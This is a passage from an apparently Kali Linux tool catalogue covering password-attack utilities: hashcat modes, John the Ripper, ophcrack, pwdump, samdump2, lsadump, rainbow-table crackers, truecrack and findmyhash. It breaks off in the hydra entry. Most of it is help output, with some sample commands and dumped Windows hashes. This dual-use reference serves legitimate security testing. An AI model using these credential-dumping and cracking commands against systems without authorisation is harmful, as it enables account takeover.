3200 = bcrypt, Blowfish(OpenBSD)
3300 = MD5(Sun)
3500 = md5(md5(md5($pass)))
3610 = md5(md5($salt).$pass)
3710 = md5($salt.md5($pass))
3720 = md5($pass.md5($salt))
3810 = md5($salt.$pass.$salt)
3910 = md5(md5($pass).md5($salt))
4010 = md5($salt.md5($salt.$pass))
4110 = md5($salt.md5($pass.$salt))
4210 = md5($username.0.$pass)
4300 = md5(strtoupper(md5($pass)))
4400 = md5(sha1($pass))
4500 = Double SHA1
4600 = sha1(sha1(sha1($pass)))
4700 = sha1(md5($pass))
4710 = sha1($salt.$pass.$salt)
4800 = MD5(Chap), iSCSI CHAP authentication
5000 = SHA-3(Keccak)
5100 = Half MD5
5200 = Password Safe SHA-256
5300 = IKE-PSK MD5
5400 = IKE-PSK SHA1
5500 = NetNTLMv1-VANILLA / NetNTLMv1-ESS
5600 = NetNTLMv2
5700 = Cisco-IOS SHA256
5800 = Android PIN
6300 = AIX {smd5}
6400 = AIX {ssha256}
6500 = AIX {ssha512}
6700 = AIX {ssha1}
6900 = GOST, GOST R 34.11-94
7000 = Fortigate (FortiOS)
7100 = OS X v10.8 / v10.9
7200 = GRUB 2
7300 = IPMI2 RAKP HMAC-SHA1
7400 = sha256crypt, SHA256(Unix)
7900 = Drupal7
8400 = WBB3, Woltlab Burning Board 3
8900 = scrypt
9200 = Cisco $8$
9300 = Cisco $9$
9800 = Radmin2
10000 = Django (PBKDF2-SHA256)
10200 = Cram MD5
10300 = SAP CODVN H (PWDSALTEDHASH) iSSHA-1
99999 = Plaintext</p></li>
<li><p>Specific hash types:</p>

<p> 11 = Joomla &lt; 2.5.18
 12 = PostgreSQL
 21 = osCommerce, xt:Commerce
 23 = Skype
101 = nsldap, SHA-1(Base64), Netscape LDAP SHA
111 = nsldaps, SSHA-1(Base64), Netscape LDAP SSHA
112 = Oracle 11g/12c
121 = SMF > v1.1
122 = OS X v10.4, v10.5, v10.6
123 = EPi
124 = Django (SHA-1)
131 = MSSQL(2000)
132 = MSSQL(2005)
133 = PeopleSoft
141 = EPiServer 6.x &lt; v4
1421 = hMailServer
1441 = EPiServer 6.x > v4
1711 = SSHA-512(Base64), LDAP {SSHA512}
1722 = OS X v10.7
1731 = MSSQL(2012 &amp; 2014)
2611 = vBulletin &lt; v3.8.5
2612 = PHPS
2711 = vBulletin > v3.8.5
2811 = IPB2+, MyBB1.2+
3711 = Mediawiki B type
3721 = WebEdition CMS
7600 = Redmine Project Management Web App
```</p></li>
</ul>


<p><strong>hashid</strong></p>

<p>hashID  is  a tool written in Python 3.x which supports the identification of over 200 unique hash types using regular expressions.</p>

<p>Usage example from the project&rsquo;s <a href="https://github.com/psypanda/hashID">Github page</a>:</p>

<p>``` plain
$ ./hashid.py &lsquo;$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1&rsquo;
Analyzing &lsquo;$P$8ohUJ.1sdFw09/bMaAQPTGDNi2BIUt1&rsquo;
[+] Wordpress ≥ v2.6.2
[+] Joomla ≥ v2.5.18
[+] PHPass' Portable Hash</p>

<p>$ ./hashid.py -mj &lsquo;$racf$<em>AAAAAAAA</em>3c44ee7f409c9a9b&rsquo;
Analyzing &lsquo;$racf$<em>AAAAAAAA</em>3c44ee7f409c9a9b&rsquo;
[+] RACF [Hashcat Mode: 8500][JtR Format: racf]</p>

<p>$ ./hashid.py hashes.txt
&mdash;File &lsquo;hashes.txt&rsquo;&mdash;
Analyzing &lsquo;*85ADE5DDF71E348162894C71D73324C043838751&rsquo;
[+] MySQL5.x
[+] MySQL4.1
Analyzing &lsquo;$2a$08$VPzNKPAY60FsAbnq.c.h5.XTCZtC1z.j3hnlDFGImN9FcpfR1QnLq&rsquo;
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
&mdash;End of file &lsquo;hashes.txt&rsquo;&mdash;
```</p>

<p><strong>hash-identifier</strong></p>

<p>Identify different types of hashes</p>

<p><code>`` plain
   #########################################################################
   #     __  __             __       ______    _____       #
   #    /\ \/\ \           /\ \     /\__  _\  /\  _</code>\     #
   #    \ \ _\ \     <strong>      </strong><strong> \ \ _</strong> \/<em>/\ \/  \ \ \/\ \    #
   #     \ \  _  \  /&lsquo;__<code>\   / ,__\ \ \  _</code>\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ _\ _/_</em>, `\ \ \ \ \ \      _\ _<em> \ \ _\ \      #
   #       \ _\ _\ _<strong> _\/_</strong></em>/  \ _\ _\     /_<em><strong><em>\ \ _</em></strong>/      #
   #        \/</em>/\/<em>/\/__/\/</em>/\/<strong><em>/    \/</em>/\/<em>/     \/</em></strong><strong>/  \/</strong>_/  v1.1 #
   #                                 By Zion3R #
   #                            www.Blackploit.com #
   #                               <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x52;&#x6f;&#111;&#116;&#64;&#66;&#108;&#x61;&#99;&#x6b;&#112;&#x6c;&#111;&#105;&#x74;&#x2e;&#99;&#x6f;&#x6d;">&#x52;&#111;&#x6f;&#x74;&#64;&#66;&#x6c;&#97;&#99;&#107;&#112;&#x6c;&#x6f;&#105;&#x74;&#x2e;&#99;&#x6f;&#x6d;</a> #
   #########################################################################</p>

<hr />

<p> HASH:</p>

<p>```</p>

<p><strong>john</strong></p>

<p>John the Ripper is a tool to find weak passwords of users in a server. John can
use  a  dictionary or some search pattern as well as a password file to check for passwords. John supports different cracking modes and  understands  many  ciphertext  formats,  like  several DES variants, MD5 and
blowfish. It can also be used to extract AFS and Windows NT passwords.</p>

<p>``` plain
John the Ripper password cracker, ver: 1.7.9-jumbo-7_omp [linux-x86-64]
Copyright &copy; 1996-2012 by Solar Designer and others
Homepage: <a href="http://www.openwall.com/john/">http://www.openwall.com/john/</a></p>

<p>Usage: john [OPTIONS] [PASSWORD-FILES]
&mdash;config=FILE             use FILE instead of john.conf or john.ini
&mdash;single[=SECTION]        &ldquo;single crack&rdquo; mode
&mdash;wordlist[=FILE] &mdash;stdin wordlist mode, read words from FILE or stdin</p>

<pre><code>              --pipe  like --stdin, but bulk reads, and allows rules
</code></pre>

<p>&mdash;loopback[=FILE]         like &mdash;wordlist, but fetch words from a .pot file
&mdash;dupe-suppression        suppress all dupes in wordlist (and force preload)
&mdash;encoding=NAME           input data is non-ascii (eg. UTF-8, ISO-8859-1).</p>

<pre><code>                      For a full list of NAME use --list=encodings
</code></pre>

<p>&mdash;rules[=SECTION]         enable word mangling rules for wordlist modes
&mdash;incremental[=MODE]      &ldquo;incremental&rdquo; mode [using section MODE]
&mdash;markov[=OPTIONS]        &ldquo;Markov&rdquo; mode (see doc/MARKOV)
&mdash;external=MODE           external mode or word filter
&mdash;stdout[=LENGTH]         just output candidate passwords [cut at LENGTH]
&mdash;restore[=NAME]          restore an interrupted session [called NAME]
&mdash;session=NAME            give a new session the NAME
&mdash;status[=NAME]           print status of a session [called NAME]
&mdash;make-charset=FILE       make a charset file. It will be overwritten
&mdash;show[=LEFT]             show cracked passwords [if =LEFT, then uncracked]
&mdash;test[=TIME]             run tests and benchmarks for TIME seconds each
&mdash;users=[&ndash;]LOGIN|UID[,..] [do not] load this (these) user(s) only
&mdash;groups=[&ndash;]GID[,..]      load users [not] of this (these) group(s) only
&mdash;shells=[&ndash;]SHELL[,..]    load users with[out] this (these) shell(s) only
&mdash;salts=[&ndash;]COUNT[:MAX]    load salts with[out] COUNT [to MAX] hashes
&mdash;pot=NAME                pot file to use
&mdash;format=NAME             force hash type NAME: afs bf bfegg bsdi crc32 crypt</p>

<pre><code>                      des django dmd5 dominosec dragonfly3-32 dragonfly3-64
                      dragonfly4-32 dragonfly4-64 drupal7 dummy dynamic_n
                      epi episerver gost hdaa hmac-md5 hmac-sha1
                      hmac-sha224 hmac-sha256 hmac-sha384 hmac-sha512
                      hmailserver ipb2 keepass keychain krb4 krb5 lm lotus5
                      md4-gen md5 md5ns mediawiki mscash mscash2 mschapv2
                      mskrb5 mssql mssql05 mysql mysql-sha1 nethalflm netlm
                      netlmv2 netntlm netntlmv2 nsldap nt nt2 odf office
                      oracle oracle11 osc pdf phpass phps pix-md5 pkzip po
                      pwsafe racf rar raw-md4 raw-md5 raw-md5u raw-sha
                      raw-sha1 raw-sha1-linkedin raw-sha1-ng raw-sha224
                      raw-sha256 raw-sha384 raw-sha512 salted-sha1 sapb
                      sapg sha1-gen sha256crypt sha512crypt sip ssh
                      sybasease trip vnc wbb3 wpapsk xsha xsha512 zip
</code></pre>

<p>&mdash;list=WHAT               list capabilities, see &mdash;list=help or doc/OPTIONS
&mdash;save-memory=LEVEL       enable memory saving, at LEVEL 1..3
&mdash;mem-file-size=SIZE      size threshold for wordlist preload (default 5 MB)
&mdash;nolog                   disables creation and writing to john.log file
&mdash;crack-status            emit a status line whenever a password is cracked
&mdash;max-run-time=N          gracefully exit after this many seconds
&mdash;regen-lost-salts=N      regenerate lost salts (see doc/OPTIONS)
&mdash;plugin=NAME[,..]        load this (these) dynamic plugin(s)
```</p>

<p><strong>johnny</strong></p>

<p>GUI for the John the Ripper password cracking tool.</p>

<p><img class="center" src="/images/kali/password/johnny.png" title="&lsquo;johnny&rsquo; &lsquo;johnny&rsquo;" ></p>

<p><strong>lsadump</strong></p>

<p>Dump LSA secrets</p>

<p><a href="http://tools.kali.org/password-attacks/creddump">Usage example from Kali site</a>:</p>

<p>``` plain
root@kali:~# lsadump system security
_SC_ALG</p>

<p>_SC_Dnscache</p>

<p>_SC_upnphost</p>

<p>20ed87e2-3b82-4114-81f9-5e219ed4c481-SALEMHELPACCOUNT</p>

<p>_SC_WebClient</p>

<p>_SC_RpcLocator</p>

<p>0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantSID
0000   01 05 00 00 00 00 00 05 15 00 00 00 B6 44 E4 23    &hellip;&hellip;&hellip;&hellip;.D.#
0010   F4 50 BA 74 07 E5 3B 2B E8 03 00 00                .P.t..;+&hellip;.</p>

<p>0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantAccount
0000   00 38 00 48 00 6F 00 31 00 49 45 00 4A 00 26 00    E.J.&amp;.8.H.o.1.I.
0010   00 63 00 72 00 48 00 68 00 53 6B 00 00 00          h.S.c.r.H.k&hellip;</p>

<p>_SC_MSDTC</p>

<p>_SC_SSDPSRV</p>

<p>_SC_Alerter</p>

<p>_SC_RpcSs</p>

<p>_SC_LmHosts</p>

<p>_SC_BthServ
```</p>

<p><strong>maskgen</strong></p>

<p>Generate hashcat masks</p>

<p><img class="center" src="/images/kali/password/maskgen.png" title="&lsquo;maskgen&rsquo; &lsquo;maskgen&rsquo;" ></p>

<p><strong>multiforcer</strong></p>

<p>A CUDA &amp; OpenCL accelerated rainbow table implementation from the ground up, and a CUDA hash brute forcing tool with support for many hash types including MD5, SHA1, LM, NTLM, and lots more.</p>

<p><a href="http://www.cryptohaze.com/multiforcer.php">Basic command line parameters</a>:</p>

<p><code>plain
-h / --hashtype [hash type] (required) This specifies the hash type to search. See the wiki for a current list of supported hashes.
-c / --charsetfile &lt;filename&gt; This specifies the charset file for single charset use.
-u / --charsetfilemulti &lt;filename&gt; This specifies the charset file for per-position charset use.
-o / --outputfile (optional) This specifies the output for found hashes. The file will be appended, not overwritten.
-f / --hashfile (required) This specifies the file of hashes. Hashes should be in ASCII-hex format (as they are typically found), one per line. The file should end with a newline.
--min / --max (required) These set the minimum and maximum password lengths to search. Lengths of 0 through 14 are currently supported.
-m / --ms (optional) This specifies the target kernel time, in milliseconds (1/1000th of a second). When using a system with a GUI, lower times will allow better display response, but will lower performance. See below for more details. The default is 50ms, which should not interfere with general system use.
-l / --lookup (optional) Use a 512MB chunk of GPU RAM to improve performance on very large hashlists. Requires at least 768MB video RAM to use.
</code></p>

<p><strong>ophcrack</strong></p>

<p>A Microsoft Windows password cracker using rainbow tables</p>

<p><img class="center" src="/images/kali/password/ophcrack.png" title="&lsquo;ophcrack&rsquo; &lsquo;ophcrack&rsquo;" ></p>

<p><strong>ophcrack-cli</strong></p>

<p>Command line interface for ophcrack</p>

<p>``` plain
ophcrack 3.4.0 by Objectif Securite (<a href="http://www.objectif-securite.ch">http://www.objectif-securite.ch</a>)</p>

<p>Usage: ophcrack [OPTIONS]
Cracks Windows passwords with Rainbow tables</p>

<p>  -a              disable audit mode (default)
  -A              enable audit mode
  -b              disable bruteforce
  -B              enable bruteforce (default)
  -c config_file  specify the config file to use
  -D              display (lots of!) debugging information
  -d dir          specify tables base directory
  -e              do not display empty passwords
  -f file         load hashes from the specified file (pwdump or session)
  -g              disable GUI
  -h              display this information
  -i              hide usernames
  -I              show usernames (default)
  -l file         log all output to the specified file
  -n num          specify the number of threads to use
  -o file         write cracking output to file in pwdump format
  -p num          preload (0 none, 1 index, 2 index+end, 3 all default)
  -q              quiet mode
  -r              launch the cracking when ophcrack starts (GUI only)
  -s              disable session auto-saving
  -S session_file specify the file to use to automatically save the progress of the search
  -u              display statistics when cracking ends
  -t table1[,a[,b,&hellip;]][:table2[,a[,b,&hellip;]]]</p>

<pre><code>              specify which table to use in the directory given by -d
</code></pre>

<p>  -v              verbose
  -w dir          load hashes from encrypted SAM file in directory dir
  -x file         export data in CSV format to file</p>

<p>Example:    ophcrack -g -d /path/to/tables -t xp_free_fast,0,3:vista_free -f in.txt</p>

<pre><code>    Launch ophcrack in command line using tables 0 and 3 in
    /path/to/tables/xp_free_fast and all tables in /path/to/tables/vista_free
    and cracks hashes from pwdump file in.txt
</code></pre>

<p>```</p>

<p><strong>policygen</strong></p>

<p>Generate hashcat masks</p>

<p>``` plain
Usage: policygen [options]</p>

<p>Type &mdash;help for more options</p>

<p>Options:
  &mdash;version             show program&rsquo;s version number and exit
  -h, &mdash;help            show this help message and exit
  &mdash;length=8            Password length
  -o masks.txt, &mdash;output=masks.txt</p>

<pre><code>                    Save masks to a file
</code></pre>

<p>  &mdash;pps=1000000000      Passwords per Second
  -v, &mdash;verbose</p>

<p>  Password Policy:</p>

<pre><code>Define the minimum (or maximum) password strength policy that you
would like to test

--mindigits=1       Minimum number of digits
--minlower=1        Minimum number of lower-case characters
--minupper=1        Minimum number of upper-case characters
--minspecial=1      Minimum number of special characters
--maxdigits=3       Maximum number of digits
--maxlower=3        Maximum number of lower-case characters
--maxupper=3        Maximum number of upper-case characters
--maxspecial=3      Maximum number of special characters
</code></pre>

<p>```</p>

<p><strong>pwdump</strong></p>

<p>Dump password hashes</p>

<p><a href="http://tools.kali.org/password-attacks/creddump">Usage example from Kali site</a>:</p>

<p><code>plain
root@kali:~# pwdump system sam
Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::
</code></p>

<p><strong>rainbowcrack</strong></p>

<p>Cracks hashes with rainbow tables.</p>

<p>``` plain
RainbowCrack 1.5
Copyright 2003-2010 RainbowCrack Project. All rights reserved.
Official Website: <a href="http://project-rainbowcrack.com/">http://project-rainbowcrack.com/</a></p>

<p>usage: rcrack rt_files [rt_files &hellip;] -h hash</p>

<pre><code>   rcrack rt_files [rt_files ...] -l hash_list_file
   rcrack rt_files [rt_files ...] -f pwdump_file
   rcrack rt_files [rt_files ...] -n pwdump_file
</code></pre>

<p>rt_files:               path to the rainbow table(s), wildchar(*, ?) supported
-h hash:                load single hash
-l hash_list_file:      load hashes from a file, each hash in a line
-f pwdump_file:         load lanmanager hashes from pwdump file
-n pwdump_file:         load ntlm hashes from pwdump file</p>

<p>hash algorithms implemented in alglib0.so:</p>

<pre><code>lm, plaintext_len limit: 0 - 7
ntlm, plaintext_len limit: 0 - 15
md5, plaintext_len limit: 0 - 15
sha1, plaintext_len limit: 0 - 20
mysqlsha1, plaintext_len limit: 0 - 20
halflmchall, plaintext_len limit: 0 - 7
ntlmchall, plaintext_len limit: 0 - 15
oracle-SYSTEM, plaintext_len limit: 0 - 10
md5-half, plaintext_len limit: 0 - 15
</code></pre>

<p>example: rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592</p>

<pre><code>     rcrack *.rt -l hash.txt
</code></pre>

<p>```</p>

<p><strong>rcracki_mt</strong></p>

<p>A modified version of rcrack which supports hybrid and indexed tables. In addition to that, it also adds multi-core support.</p>

<p>``` plain
RainbowCrack (improved, multi-threaded) &ndash; Making a Faster Cryptanalytic Time-Memory Trade-Off
by Martin Westergaard <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x6d;&#x61;&#114;&#116;&#105;&#x6e;&#119;&#x6a;&#50;&#48;&#x30;&#x35;&#x40;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;">&#109;&#97;&#114;&#116;&#x69;&#110;&#x77;&#106;&#50;&#48;&#x30;&#53;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a>
multi-threaded and enhanced by neinbrucke
*nix/64-bit compatibility and co-maintainer &ndash; James Nobis <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#113;&#117;&#101;&#108;&#64;&#113;&#x75;&#101;&#108;&#x72;&#111;&#100;&#x2e;&#110;&#x65;&#116;">&#x71;&#x75;&#x65;&#108;&#x40;&#113;&#x75;&#101;&#x6c;&#114;&#111;&#x64;&#x2e;&#110;&#101;&#x74;</a>
<a href="http://www.freerainbowtables.com/">http://www.freerainbowtables.com/</a>
All code/binaries are under GPL2 Copyright at a minimum
original code by Zhu Shuanglei <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x73;&#104;&#117;&#x61;&#x6e;&#103;&#x6c;&#x65;&#x69;&#64;&#104;&#111;&#x74;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;">&#115;&#104;&#117;&#97;&#110;&#103;&#x6c;&#x65;&#105;&#x40;&#104;&#111;&#116;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></p>

<p>usage: rcracki_mt -h hash rainbow_table_pathname</p>

<pre><code>   rcracki_mt -l hash_list_file rainbow_table_pathname
   rcracki_mt -f pwdump_file rainbow_table_pathname
   rcracki_mt -c lst_file rainbow_table_pathname
</code></pre>

<p>-h hash:                use raw hash as input
-l hash_list_file:      use hash list file as input, each hash in a line
-f pwdump_file:         use pwdump file as input, handles lanmanager hash only
-c lst_file:            use .lst (cain format) file as input
-r [-s session_name]:   resume from previous session, optional session name
rainbow_table_pathname: pathname(s) of the rainbow table(s)</p>

<p>Extra options:    -t [nr] use this amount of threads/cores, default is 1</p>

<pre><code>              -o [output_file] write (temporary) results to this file
              -s [session_name] write session data with this name
              -k keep precalculation on disk
              -d run sha1 hashes against mysqlsha1 tables
              -m [megabytes] limit memory usage
              -v show debug information
</code></pre>

<p>example: rcracki_mt -h 5d41402abc4b2a76b9719d911017c592 -t 2 [path]/MD5</p>

<pre><code>     rcracki_mt -l hash.txt [path_to_specific_table]/*
     rcracki_mt -f hash.txt -t 4 -o results.txt *.rti
</code></pre>

<p>```</p>

<p><strong>rsmangler</strong></p>

<p>RSMangler will take a wordlist and perform various manipulations on it similar to those done by John the Ripper, the main difference being that it will first take the input words and generate all permutations and the acronym of the words (in the order they appear in the file) before it applies the rest of the mangles.</p>

<p>``` plain
rsmangler v 1.4 Robin Wood (<a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#114;&#x6f;&#98;&#105;&#x6e;&#64;&#x64;&#x69;&#103;&#105;&#x6e;&#x69;&#x6e;&#x6a;&#x61;&#x2e;&#x6f;&#x72;&#103;">&#114;&#111;&#98;&#x69;&#x6e;&#64;&#x64;&#105;&#x67;&#105;&#x6e;&#105;&#x6e;&#106;&#97;&#x2e;&#x6f;&#x72;&#103;</a>) &lt;www.randomstorm.com></p>

<p>To pass the initial words in on standard in do:</p>

<p>cat wordlist.txt | ./rsmangler.rb &mdash;file &ndash; > new_wordlist.rb</p>

<p>All options are ON by default, these parameters turn them OFF</p>

<p>Usage: rsmangler.rb [OPTION]</p>

<pre><code>--help, -h: show help
--file, -f: the input file, use - for STDIN
--max, -x: maximum word length
--min, -m: minimum word length
--perms, -p: permutate all the words
--double, -d: double each word
--reverse, -r: reverser the word
--leet, -t: l33t speak the word
--full-leet, -T: all posibilities l33t
--capital, -c: capitalise the word
--upper, -u: uppercase the word
--lower, -l: lowercase the word
--swap, -s: swap the case of the word
--ed, -e: add ed to the end of the word
--ing, -i: add ing to the end of the word
--punctuation: add common punctuation to the end of the word
--years, -y: add all years from 1990 to current year to start and end
--acronym, -a: create an acronym based on all the words entered in order and add to word list
--common, -C: add the following words to start and end: admin, sys, pw, pwd
--pna: add 01 - 09 to the end of the word
--pnb: add 01 - 09 to the beginning of the word
--na: add 1 - 123 to the end of the word
--nb: add 1 - 123 to the beginning of the word
--force - don't check ooutput size
--space - add spaces between words
</code></pre>

<p>```</p>

<p><strong>samdump2</strong></p>

<p>Dumps Windows 2k/NT/XP/Vista password hashes</p>

<p>``` plain
samdump2 1.1.1 by Objectif Securite
<a href="http://www.objectif-securite.ch">http://www.objectif-securite.ch</a>
original author: <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#110;&#x63;&#117;&#x6f;&#x6d;&#x6f;&#x40;&#x73;&#116;&#117;&#x64;&#101;&#110;&#x74;&#105;&#x2e;&#x75;&#x6e;&#x69;&#110;&#x61;&#46;&#x69;&#x74;">&#x6e;&#99;&#117;&#111;&#x6d;&#111;&#x40;&#x73;&#x74;&#117;&#100;&#x65;&#x6e;&#x74;&#105;&#x2e;&#x75;&#110;&#x69;&#110;&#x61;&#46;&#x69;&#116;</a></p>

<p>Usage:
samdump2 samhive keyfile
```</p>

<p><strong>sipcrack</strong></p>

<p>SIPcrack is a SIP login sniffer/cracker that contains 2 programs:  sipdump  to  capture  the digest authentication and sipcrack to bruteforce
the hash using a wordlist or standard input.</p>

<p>sipcrack bruteforces the user&rsquo;s password with the dump  file  generated
by  sipdump. If a password is found, the sniffed and cracked login will
be updated in the dump file.</p>

<p><img class="center" src="/images/kali/password/sipcrack.png" title="&lsquo;sipcrack&rsquo; &lsquo;sipcrack&rsquo;" ></p>

<p><strong>sucrack</strong></p>

<p>Multithreaded Linux/UNIX tool for brute-force cracking
of local user accounts via su.</p>

<p><code>plain
sucrack [options] wordlist
</code></p>

<p><strong>truecrack</strong></p>

<p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux and it is optimized for Nvidia Cuda technology. It supports:</p>

<p>PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512 and Whirlpool.</p>

<p>XTS block cipher mode for hard disk encryption based on encryption algorithms: AES, SERPENT, TWOFISH.</p>

<p>File-hosted (container) and Partition/device-hosted.</p>

<p>Hidden volumes and Backup headers.</p>

<p>TrueCrack is able to perform a brute-force attack based on:</p>

<p>Dictionary: read the passwords from a file of words.</p>

<p>Alphabet: generate all passwords of given length from given alphabet.</p>

<p>TrueCrack works on gpu and cpu</p>

<p>``` plain
TrueCrack v3.0
Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
Contact us: <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#105;&#110;&#102;&#x6f;&#x74;&#114;&#117;&#101;&#x63;&#114;&#97;&#99;&#x6b;&#x40;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#99;&#111;&#109;">&#105;&#110;&#x66;&#x6f;&#116;&#114;&#117;&#101;&#x63;&#114;&#97;&#99;&#x6b;&#64;&#103;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;</a>
Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
Copyright &copy; 2011 by Luca Vaccaro.</p>

<p>Usage:
 truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -w &lt;wordlist_file> [-b &lt;parallel_block>]
 truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -c <charset> [-s <minlength>] -m <maxlength> [-b &lt;parallel_block>]</p>

<p>Options:
 -h &mdash;help                      Display this information.
 -t &mdash;truecrypt &lt;truecrypt_file>    Truecrypt volume file.
 -k &mdash;key <ripemd160 | sha512 | whirlpool>      Key derivation function (default ripemd160).
 -b &mdash;blocksize &lt;parallel_blocks>       Number of parallel computations (board dependent).
 -w &mdash;wordlist &lt;wordlist_file>      File of words, for Dictionary attack.
 -c &mdash;charset <alphabet>        Alphabet generator, for Alphabet attack.
 -s &mdash;startlength <minlength>       Starting length of passwords, for Alphabet attack (default 1).
 -m &mdash;maxlength <maxlength>     Maximum length of passwords, for Alphabet attack.
 -r &mdash;restore <number>          Restore the computation.
 -v &mdash;verbose                   Show computation messages.</p>

<p>Sample:
 Dictionary mode: truecrack &mdash;truecrypt ./volume &mdash;wordlist ./dictionary.txt
 Charset mode: truecrack &mdash;truecrypt ./volume &mdash;charset ./dictionary.txt &mdash;maxlength 10
```</p>

<h3>Online Attacks</h3>

<p><strong>cewl</strong></p>

<p>CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.</p>

<p><img class="center" src="/images/kali/password/cewl.png" title="&lsquo;cewl&rsquo; &lsquo;cewl&rsquo;" ></p>

<p><strong>findmyhash</strong></p>

<p>Crack different types of hashes using free online services</p>

<p>``` plain
/usr/bin/findmyhash 1.1.2 ( <a href="http://code.google.com/p/findmyhash/">http://code.google.com/p/findmyhash/</a> )</p>

<h2>Usage: </h2>

<p>  python /usr/bin/findmyhash <algorithm> OPTIONS</p>

<h2>Accepted algorithms are:</h2>

<p>  MD4       &ndash; RFC 1320
  MD5       &ndash; RFC 1321
  SHA1      &ndash; RFC 3174 (FIPS 180-3)
  SHA224    &ndash; RFC 3874 (FIPS 180-3)
  SHA256    &ndash; FIPS 180-3
  SHA384    &ndash; FIPS 180-3
  SHA512    &ndash; FIPS 180-3
  RMD160    &ndash; RFC 2857
  GOST      &ndash; RFC 5831
  WHIRLPOOL &ndash; ISO/IEC 10118-3:2004
  LM        &ndash; Microsoft Windows hash
  NTLM      &ndash; Microsoft Windows hash
  MYSQL     &ndash; MySQL 3, 4, 5 hash
  CISCO7    &ndash; Cisco IOS type 7 encrypted passwords
  JUNIPER   &ndash; Juniper Networks $9$ encrypted passwords
  LDAP_MD5  &ndash; MD5 Base64 encoded
  LDAP_SHA1 &ndash; SHA1 Base64 encoded</p>

<p>  NOTE: for LM / NTLM it is recommended to introduce both values with this format:</p>

<pre><code>     python /usr/bin/findmyhash LM   -h 9a5760252b7455deaad3b435b51404ee:0d7f1f2bdeac6e574d6e18ca85fb58a7
     python /usr/bin/findmyhash NTLM -h 9a5760252b7455deaad3b435b51404ee:0d7f1f2bdeac6e574d6e18ca85fb58a7
</code></pre>

<h2>Valid OPTIONS are:</h2>

<p>  -h &lt;hash_value>  If you only want to crack one hash, specify its value with this option.</p>

<p>  -f <file>        If you have several hashes, you can specify a file with one hash per line.</p>

<pre><code>               NOTE: All of them have to be the same type.
</code></pre>

<p>  -g               If your hash cannot be cracked, search it in Google and show all the results.</p>

<pre><code>               NOTE: This option ONLY works with -h (one hash input) option.
</code></pre>

<h2>Examples:</h2>

<p>  &ndash;> Try to crack only one hash.</p>

<pre><code> python /usr/bin/findmyhash MD5 -h 098f6bcd4621d373cade4e832627b4f6
</code></pre>

<p>  &ndash;> Try to crack a JUNIPER encrypted password escaping special characters.</p>

<pre><code> python /usr/bin/findmyhash JUNIPER -h "\$9\$LbHX-wg4Z"
</code></pre>

<p>  &ndash;> If the hash cannot be cracked, it will be searched in Google.</p>

<pre><code> python /usr/bin/findmyhash LDAP_SHA1 -h "{SHA}cRDtpNCeBiql5KOQsKVyrA0sAiA=" -g
</code></pre>

<p>  &ndash;> Try to crack multiple hashes using a file (one hash per line).</p>

<pre><code> python /usr/bin/findmyhash MYSQL -f mysqlhashesfile.txt
</code></pre>

<h2>Contact:</h2>

<p>[Web]           <a href="http://laxmarcaellugar.blogspot.com/">http://laxmarcaellugar.blogspot.com/</a>
[Mail/Google+]  <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x62;&#x6c;&#111;&#103;&#108;&#x61;&#x78;&#109;&#x61;&#114;&#x63;&#97;&#101;&#108;&#108;&#117;&#103;&#97;&#x72;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#x62;&#108;&#111;&#103;&#108;&#97;&#120;&#x6d;&#x61;&#x72;&#x63;&#x61;&#101;&#x6c;&#x6c;&#117;&#x67;&#97;&#114;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;</a>
[twitter]       @laXmarcaellugar
```</p>

<p><strong>hydra</strong></p>

<p>Hydra  is a parallized login cracker which supports numerous protocols to attack. New modules are easy to add, beside that, it is flexible
and very fast.</p>

<p>Currently this tool supports:</p>

<pre><code>    AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, FTPS,
    HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY,
    HTTP-PROXY-URLENUM, ICQ, IMAP, IRC, LDAP2, LDAP3, MS-SQL, MYSQL, NCP, NNTP,
